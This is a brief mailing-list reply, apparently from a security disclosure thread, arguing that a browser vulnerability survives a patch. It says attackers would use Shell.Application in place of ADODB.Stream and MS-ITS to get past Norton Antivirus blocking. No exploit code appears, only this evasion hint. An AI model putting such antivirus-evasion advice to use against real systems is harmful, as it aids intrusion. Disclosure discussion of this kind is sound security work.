Subject: RE: THE VULNERABILITY STILL WORKS AFTER TODAY'S PATCH




at the very beginning, using shell.application is not "another" way - it's
actually the only solution available for the general public. most of
profitable systems to crack today have norton.antivirus.enterprise.xxxx
installed - which means MS-ITS& Adodb.Stream are disabled. i must admit,
norton.antivirus did stop the insider exploit - this time. 

so, a real malicious attacker with normal intel would never simply copy the
public exploit(which involves MS-ITS and ADODB.STREAM) and send it to his
targets - he'll use shell.application instead of adodb.stream.

the most weired thing is the following fact:
norton is securing windows faster than microsoft.
(the latter is OS PRODUCER, while the former is ANTIVIRUS)
